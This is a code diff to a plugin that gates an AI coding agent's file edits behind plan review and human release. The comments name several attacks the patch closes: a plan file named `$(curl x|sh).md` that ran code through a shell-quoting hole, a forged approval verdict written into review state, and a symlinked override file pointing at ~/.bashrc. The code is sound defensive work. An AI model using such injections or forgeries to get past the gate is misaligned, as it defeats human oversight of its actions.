@@ -11,6 +11,8 @@ Subcommands (all read the hook JSON on stdin, except the manual ones):
   status   [plan]       shows the state
   release  <plan> --reason R    human override, with a trail
   run-checks <path>     runs the registered checks; approves when every required one passes
+  hash <file>           prints the content hash the gate records
+  config <path>         prints the resolved repo config as JSON
   register-check <manifest>     registers a plugin's plan-gate-check.json
   register-checks       SessionStart: registers this plugin's own plan-gate-check.json (never stdout)
   checks list|prune     lists the registered checks / removes the orphans
@@ -93,9 +95,65 @@ def command(script):
     return f'python3 "{os.path.join(PLUGIN_DIR, "bin", script)}"'
 
 
+def shell_path(path):
+    """R17: a file path as ONE shell word for a command the model is told to run -- `shlex.quote`, never `"..."`:
+    double quotes still expand `$(...)` and backticks, so a plan named `$(curl x|sh).md` ran code (final review I2).
+    Under the home it is `~/'<rest>'`: the tilde stays OUTSIDE the quotes (it does not expand inside them), and the
+    home is not printed."""
+    shown = without_home(os.path.abspath(path))
+    if shown.startswith("~/"):
+        return "~/" + shlex.quote(shown[2:])
+    return shlex.quote(shown)
+
+
 # ⚠️ PLAN_GATE_DIR exists so the TESTS do not dirty the real state of whoever runs the suite, and so the
 # state lives OUTSIDE the plugin: it has to survive uninstalling and reinstalling, otherwise an update
 # turns a released plan back to pending. Read on every call (state_dir() is never cached).
+POINTER = os.path.join("gate", "pointer.json")
+
+
+def _version():
+    try:
+        with open(os.path.join(PLUGIN_DIR, ".claude-plugin", "plugin.json"), encoding="utf-8") as f:
+            return json.load(f).get("version", "?")
+    except (OSError, ValueError):
+        return "?"
+
+
+def write_pointer():
+    """<state>/gate/pointer.json: where other plugins find THIS plan_gate.py (adversarial-review spec §4.1.2).
+
+    Rewritten only when it changed (it runs on every hook). A failure is logged and nothing more: it is a pointer,
+    not state -- a plugin that cannot find the gate refuses on its side (fail closed there).
+    """
+    target = os.path.join(state_dir(), POINTER)
+    data = {"plan_gate": os.path.abspath(__file__), "version": _version()}
+    try:
+        with open(target, encoding="utf-8") as f:
+            if json.load(f) == data:
+                return
+    except Exception:       # noqa: BLE001 -- a crafted pointer (deep nesting: RecursionError) is just rewritten
+        pass
+    tmp = f"{target}.{os.getpid()}.tmp"
+    try:
+        os.makedirs(os.path.dirname(target), exist_ok=True)
+        with open(tmp, "w", encoding="utf-8") as f:
+            json.dump(data, f)
+        os.replace(tmp, target)
+    except OSError as error:
+        # ⚠️ Nothing here may raise: main's catch-all returns 0 for the `check` hook BEFORE cmd_check runs, i.e.
+        # every tool allowed. An unwritable state folder must not turn a pointer failure into a fail-open.
+        try:
+            os.remove(tmp)
+        except OSError:
+            pass
+        try:
+            with open(log_path(), "a", encoding="utf-8") as fh:
+                fh.write(f"{datetime.datetime.now().isoformat()} pointer: {error!r}\n")
+        except OSError:
+            pass
+
+
 def log_path():
     return os.path.join(state_dir(), "errors.log")
 
@@ -135,6 +193,9 @@ INNOCENT_REDIRECT = re.compile(r">>?\s*(/dev/null|/tmp/\S*|&\d)")
 RE_EXPANSION = re.compile(r"\$\(([^()]*)\)|`([^`]*)`")
 # Text between quotes is an ARGUMENT, not syntax: `--reason "fixed > before"` does not redirect.
 RE_QUOTES = re.compile(r"'[^']*'|\"[^\"]*\"")
+# ⚠️ ... but the argument is still THERE: a quoted string becomes a word, never nothing. Erasing it to a blank turned
+# `echo x > "app.py"` into `echo x >`, which no rule reads as a write (final review S2).
+QUOTED_WORD = " _quoted_ "
 # ⚠️ ... EXCEPT for whoever interprets the argument as a PROGRAM. For `bash -c`, `sh -c`, `eval` and
 # `xargs`, what is between quotes is code, and erasing the quotes before looking for a mutation would
 # hide `bash -c "sed -i s/a/b/ x.py"` entirely.
@@ -196,10 +257,10 @@ def bash_is_safe(command, depth=0):
             for m in RE_QUOTES.finditer(p):
                 if not bash_is_safe(m.group(0)[1:-1], depth + 1):
                     return False
-            if BASH_MUTATION.search(RE_QUOTES.sub(" ", p)):
+            if BASH_MUTATION.search(RE_QUOTES.sub(QUOTED_WORD, p)):
                 return False   # and the rest of the command counts too
             continue
-        if BASH_MUTATION.search(RE_QUOTES.sub(" ", p)):
+        if BASH_MUTATION.search(RE_QUOTES.sub(QUOTED_WORD, p)):
             return False
     return True
 
@@ -488,6 +549,44 @@ def _in_state_dir(path):
     return p == folder or p.startswith(folder.rstrip(os.sep) + os.sep)
 
 
+def _review_state_dirs():
+    """S2 (R16): the folders whose content can approve a plan -- the whole `~/.claude/claude-workflow/` (plan-gate's
+    and adversarial-review's state live side by side there), plus PLAN_GATE_DIR and ADVERSARIAL_REVIEW_DIR when set."""
+    dirs = [os.path.expanduser(os.path.join("~", ".claude", "claude-workflow")), state_dir()]
+    if os.environ.get("ADVERSARIAL_REVIEW_DIR"):
+        dirs.append(os.environ["ADVERSARIAL_REVIEW_DIR"])
+    return dirs
+
+
+def _in_review_state(path):
+    p = os.path.realpath(path)
+    for d in _review_state_dirs():
+        folder = os.path.realpath(d)
+        if p == folder or p.startswith(folder.rstrip(os.sep) + os.sep):
+            return True
+    return False
+
+
+def _anything_pending():
+    """Is any plan or spec pending, in any repo? A corrupt state counts (fail closed), and so does an approval or a
+    release whose file changed since. Never raises: it is only asked on the way to a denial."""
+    try:
+        states, corrupt = _states()
+        if corrupt:
+            return True
+        for e in states:
+            target = e.get("gate_spec") or e.get("plan")
+            if not isinstance(target, str) or not os.path.isfile(target):
+                continue
+            if e.get("status") == "pending":
+                return True
+            if e.get("plan_hash") and content_hash(target) != e.get("plan_hash"):
+                return True
+        return False
+    except Exception:       # noqa: BLE001 -- unknown is pending
+        return True
+
+
 def _broken_config(repo, tool, ti):
     """NEW (R21/R26): the exit code of `check` when the repo's config is broken, or None when it loads.
 
@@ -538,7 +637,7 @@ def cmd_mark(entry):
     status, results = run_checks(path)
     if status == "approved":
         return 0          # R33: approved by the checks -- nothing to send back to the model
-    print(i18n.t("gate.mark_plan", repo=repo, name=os.path.basename(path), path=without_home(os.path.abspath(path)),
+    print(i18n.t("gate.mark_plan", repo=repo, name=os.path.basename(path), path=shell_path(path),
                  gate=command("plan_gate.py")) + _failed_checks(results, repo),
           file=sys.stderr)
     return 2  # exit 2 sends the stderr back to the model
@@ -554,7 +653,7 @@ def _mark_spec(path, repo):
     status, results = run_checks(path)
     if status == "approved":
         return 0
-    print(i18n.t("gate.mark_spec", repo=repo, name=os.path.basename(path), path=without_home(os.path.abspath(path)),
+    print(i18n.t("gate.mark_spec", repo=repo, name=os.path.basename(path), path=shell_path(path),
                  gate=command("plan_gate.py"), spec_preflight=command("preflight_spec.py"))
           + _failed_checks(results, repo),
           file=sys.stderr)
@@ -613,7 +712,7 @@ def run_checks(path):
     if not held:
         write_state(path, status="pending", plan_hash=h, **extra)
     required = [c for c in checks.applicable(kind, repo) if c["required"]]
-    results = {c["id"]: checks.run(c, path) for c in required}
+    results = {c["id"]: checks.run(c, path, content_hash=h) for c in required}
     if content_hash(path) != h:
         return "pending", results
     recorded = {cid: {"status": r["status"], "hash": h} for cid, r in results.items()}
@@ -629,21 +728,40 @@ def run_checks(path):
     return "pending", results
 
 
+DETAIL_MAX_LINES, DETAIL_MAX_BYTES = 20, 4096
+
+
 def _failed_checks(results, repo):
     """The lines naming each check that did not pass (empty when no check ran)."""
     lines = []
     for cid, r in results.items():
         if r["status"] == "pass":
             continue
-        groups = []
+        groups, detail = [], []
         for g in r.get("findings") or []:
             if not isinstance(g, dict) or g.get("state") in ("ok", "not_applicable"):
                 continue
+            items = g.get("items") if isinstance(g.get("items"), list) else []    # never raises on a bad shape
             if g.get("group") == checks.ERROR_GROUP:
-                groups.append(f"{checks.ERROR_GROUP}: " + "; ".join(str(i) for i in g.get("items") or []))
+                groups.append(f"{checks.ERROR_GROUP}: " + "; ".join(str(i) for i in items))
             else:
                 groups.append(str(g.get("group")))
+                # a check that says WHY (and what to run) must reach the model: adversarial-review's finding carries
+                # the review.py command, and naming only the group left the person with nothing to act on. The
+                # preflights keep their group ids only (their detail is in their own report).
+                if g.get("state") == "findings" and cid not in OWN_CHECK.values():
+                    for item in items:
+                        detail.extend(str(item).splitlines())
         lines.append(i18n.t("gate.check_failed_line", repo=repo, id=cid, groups=", ".join(groups) or "fail"))
+        shown, size = [], 0
+        for part in detail:
+            size += len(part.encode("utf-8", "replace")) + 1
+            if len(shown) >= DETAIL_MAX_LINES or size > DETAIL_MAX_BYTES:
+                break
+            shown.append(part)
+        lines.extend("      " + part for part in shown)
+        if len(shown) < len(detail):
+            lines.append("      " + i18n.t("gate.check_detail_more", repo=repo, n=len(detail) - len(shown)))
     if not lines:
         return ""
     return "\n" + i18n.t("gate.checks_failed", repo=repo) + "\n" + "\n".join(lines)
@@ -743,6 +861,11 @@ def _check(entry):
     if fp and _in_state_dir(fp):
         print(i18n.t("gate.deny_state_dir", path=without_home(os.path.abspath(fp)),
                      folder=without_home(state_dir())), file=sys.stderr)
+        return 2
+    # S2 (R16): adversarial-review's verdicts live next door; a forged `{"verdict": "APPROVED"}` there approves the
+    # plan as surely as a forged gate state. Denied while anything is pending, and before the opt-out, like R82.
+    if fp and _in_review_state(fp) and _anything_pending():
+        print(i18n.t("gate.deny_review_state", path=without_home(os.path.abspath(fp))), file=sys.stderr)
         return 2
     if gate_off():
         return 0
@@ -923,6 +1046,45 @@ def releases_of_repo(repo):
     return out
 
 
+OWN_CHECK = {"plan": "preflight", "spec": "preflight-spec"}
+
+
+def _other_checks(kind, path, repo, despite):
+    """-> (refusal or None, despite-check escapes). Release runs every required applicable check that is not the
+    preflight (adversarial-review spec §4.2): each one that fails needs `--despite-check <id>="…"`.
+
+    ⚠️ Before 0.2.0 a `--reason` released a plan whose adversarial review had REJECTED it, with no trail of that:
+    release only re-ran the preflight groups.
+    """
+    asked = {}
+    for cid, just in despite:
+        if cid in asked:
+            return i18n.t("gate.despite_duplicate", repo=repo, check=cid), []
+        asked[cid] = just
+    # Only a HEALTHY (or merely unregistered, R35: release runs the preflight itself) own entry is skipped: a corrupted or contested `preflight` comes back from
+    # checks.registered() as {"id": "preflight", "error": ...} (R32) -- required and failing, so it must block.
+    others = [c for c in checks.applicable(kind, repo)
+              if c["required"] and not (c["id"] == OWN_CHECK[kind] and ("error" not in c or c.get("missing")))]
+    ids = [c["id"] for c in others]
+    for cid in asked:
+        if cid not in ids:
+            return i18n.t("gate.despite_unknown_check", repo=repo, check=repr(cid), checks=", ".join(ids) or "—"), []
+    h = content_hash(path)
+    failing = {}
+    for c in others:
+        r = checks.run(c, path, content_hash=h)
+        if r["status"] == "pass":
+            if c["id"] in asked:
+                return i18n.t("gate.despite_check_passed", repo=repo, check=c["id"]), []
+        elif c["id"] not in asked:
+            failing[c["id"]] = r
+    if failing:
+        return (i18n.t("gate.blocking_checks", repo=repo, checks=", ".join(failing))
+                + _failed_checks(failing, repo)
+                + "\n" + i18n.t("gate.despite_check_hint", repo=repo, check=list(failing)[0])), []
+    return None, [{"group": cid, "type": "despite-check", "text": just} for cid, just in asked.items()]
+
+
 def _release_spec(spec, a):
     """Releases a SPEC: runs the spec preflight right then and refuses if there is a blocking finding.
 
@@ -956,7 +1118,7 @@ def _release_spec(spec, a):
         state = res[group][0]
         if not blocks_of[group] or state != "findings":
             shown = state if blocks_of[group] else i18n.t("gate.state_not_blocking", repo=repo, state=state)
-            print(i18n.t("gate.false_positive_wrong_state", repo=repo, group=group, state=shown), file=sys.stderr)
+            print(i18n.t("gate.spec_false_positive_wrong_state", repo=repo, group=group, state=shown), file=sys.stderr)
             return 2
     blocking = []
     for gid, _title, blocks in psp.GROUPS:
@@ -976,27 +1138,30 @@ def _release_spec(spec, a):
             print(i18n.t("gate.spec_fix_or_escape", repo=repo, group=gid), file=sys.stderr)
         print(i18n.t("gate.spec_memory_warning", repo=repo), file=sys.stderr)
         return 2
+    refusal, despite = _other_checks("spec", spec, repo, a.despite)
+    if refusal:
+        print(i18n.t("gate.not_released", repo=repo, reason=refusal), file=sys.stderr)
+        return 2
     trigger = os.environ.get("PLAN_GATE_TEST_EDIT")      # race test hook (only when the variable is set)
     if trigger:
         subprocess.run([sys.executable, trigger], check=False)
     with open(spec, "rb") as f:
         if _raw_digest(f.read()) != raw:
-            print(i18n.t("gate.changed_during_check", repo=repo), file=sys.stderr)
+            print(i18n.t("gate.spec_changed_during_check", repo=repo), file=sys.stderr)
             return 2
     now = datetime.datetime.now().astimezone().isoformat(timespec="seconds")
+    spec_escapes = ([{"group": g, "type": "false-positive", "text": j, "when": now} for g, j in escaped.items()]
+                    + [dict(d, when=now) for d in despite])
     write_state(spec, status="released", gate_spec=os.path.abspath(spec),
                 plan_hash=content_hash(spec), override_reason=a.reason.strip(),
-                released_at=now,
-                escapes=[{"group": g, "type": "false-positive", "text": j, "when": now}
-                         for g, j in escaped.items()])
-    record_in_log(spec, a.reason.strip(),
-                  [{"group": g, "type": "false-positive", "text": j, "when": now}
-                   for g, j in escaped.items()], now)
+                released_at=now, escapes=spec_escapes)
+    record_in_log(spec, a.reason.strip(), spec_escapes, now)
     _timeline_event(repo, "spec_released")      # not `released`: that one opens the implementation phase
     print(i18n.t("gate.spec_released", repo=repo, path=without_home(spec)))
     print(i18n.t("gate.reason_line", repo=repo, reason=a.reason.strip()))
-    if escaped:
-        print(i18n.t("gate.with_escape", repo=repo, escapes=", ".join(f"{g} (false-positive)" for g in escaped)))
+    if spec_escapes:
+        print(i18n.t("gate.with_escape", repo=repo,
+                     escapes=", ".join(f"{d['group']} ({d['type']})" for d in spec_escapes)))
     return 0
 
 
@@ -1006,6 +1171,7 @@ def cmd_release(args):
     p.add_argument("--reason", default="")
     p.add_argument("--false-positive", action="append", default=[], type=_pair, dest="false_positives")
     p.add_argument("--no-coverage", action="append", default=[], type=_pair, dest="no_coverage")
+    p.add_argument("--despite-check", action="append", default=[], type=_pair, dest="despite")
     try:
         a = p.parse_args(args)
     except InvalidEscape as e:
@@ -1076,6 +1242,13 @@ def cmd_release(args):
                          reason=(" — " + r.reason if r.reason else ""), verb=verb), file=sys.stderr)
         return 2
 
+    refusal, despite = _other_checks("plan", plan, repo, a.despite)
+    if refusal:
+        print(i18n.t("gate.not_released", repo=repo, reason=refusal), file=sys.stderr)
+        return 2
+    for d in despite:      # keyed apart so a check never collides with a preflight group of the same name
+        escaped["despite-check:" + d["group"]] = d
+
     # 2. race test hook (exists only when the variable is set)
     trigger = os.environ.get("PLAN_GATE_TEST_EDIT")
     if trigger:
@@ -1093,13 +1266,17 @@ def cmd_release(args):
     for d in escaped.values():
         d["when"] = now
     escapes = list(escaped.values())
-    write_state(plan, status="released", plan_hash=content_hash(plan),
-                override_reason=a.reason.strip(), released_at=now, escapes=escapes)
-    record_in_log(plan, a.reason.strip(), escapes, now)
-    _timeline_event(repo, "released")           # after the state and the log: it can never undo them
     rev = os.path.join(os.path.dirname(plan), "reviews")
     os.makedirs(rev, exist_ok=True)
-    with open(os.path.join(rev, os.path.basename(plan)[:-3] + "-override.md"), "a", encoding="utf-8") as fh:
+    # ⚠️ O_NOFOLLOW: a committed `reviews/<plan>-override.md -> ~/.bashrc` must not be appended to through the link.
+    # Opened BEFORE the state is written: a refused trail (ELOOP) must leave the plan unreleased, not half released.
+    fd = os.open(os.path.join(rev, os.path.basename(plan)[:-3] + "-override.md"),
+                 os.O_WRONLY | os.O_APPEND | os.O_CREAT | os.O_NOFOLLOW, 0o644)
+    with os.fdopen(fd, "a", encoding="utf-8") as fh:
+        write_state(plan, status="released", plan_hash=content_hash(plan),
+                    override_reason=a.reason.strip(), released_at=now, escapes=escapes)
+        record_in_log(plan, a.reason.strip(), escapes, now)
+        _timeline_event(repo, "released")           # after the state and the log: it can never undo them
         fh.write(i18n.t("gate.override_entry", repo=repo, when=now, reason=a.reason.strip()))
         for d in escaped.values():
             fh.write(i18n.t("gate.override_escape", repo=repo, group=d["group"], type=d["type"], text=d["text"]))
@@ -1162,6 +1339,36 @@ def cmd_checks(args):
     return 2
 
 
+def cmd_hash(args):
+    if len(args) != 1:
+        print(i18n.t("gate.usage"), file=sys.stderr)
+        return 2
+    path = os.path.abspath(args[0])
+    h = content_hash(path)
+    if h is None:
+        print(i18n.t("gate.hash_unreadable", path=without_home(path)), file=sys.stderr)
+        return 2
+    print(h)
+    return 0
+
+
+def cmd_config(args):
+    """The resolved repo config as JSON -- how other plugins read folders and language without a second reader of
+    .claude/plan-gate.json (adversarial-review spec §4.1.5)."""
+    if len(args) != 1:
+        print(i18n.t("gate.usage"), file=sys.stderr)
+        return 2
+    target = os.path.abspath(args[0])
+    repo = repo_of(target)
+    try:
+        cfg = config.load(repo)
+    except ValueError as e:
+        print(i18n.t("gate.config_unreadable", error=e), file=sys.stderr)
+        return 2
+    print(json.dumps(dict(cfg, repo=repo), ensure_ascii=False))
+    return 0
+
+
 HOOK_SUBCOMMANDS = {"mark", "check", "register-check", "register-checks"}
 
 
@@ -1169,8 +1376,21 @@ def main():
     if len(sys.argv) < 2:
         sys.exit(i18n.t("gate.usage"))
     sub = sys.argv[1]
+    if sub in ("-h", "--help"):
+        print(i18n.t("gate.help"))
+        return 0
     try:
         os.makedirs(state_dir(), exist_ok=True)
+        write_pointer()
+        if sub in ("mark", "run-checks", "register-checks", "release", "status"):
+            try:
+                checks.ingest_inbox()
+            except Exception as error:  # noqa: BLE001 -- a broken inbox must not unmark a plan
+                try:    # ⚠️ and neither may an unwritable log: an OSError here reached the hooks' fail-open handler
+                    with open(log_path(), "a", encoding="utf-8") as fh:
+                        fh.write(f"{datetime.datetime.now().isoformat()} inbox: {error!r}\n")
+                except OSError:
+                    pass
         if sub in ("mark", "check"):
             raw = sys.stdin.read() or "{}"
             entry = json.loads(raw)
@@ -1181,6 +1401,10 @@ def main():
             return cmd_release(sys.argv[2:])
         if sub == "run-checks":
             return cmd_run_checks(sys.argv[2:])
+        if sub == "hash":
+            return cmd_hash(sys.argv[2:])
+        if sub == "config":
+            return cmd_config(sys.argv[2:])
         if sub == "register-check":
             return cmd_register_check(sys.argv[2:])
         if sub == "register-checks":
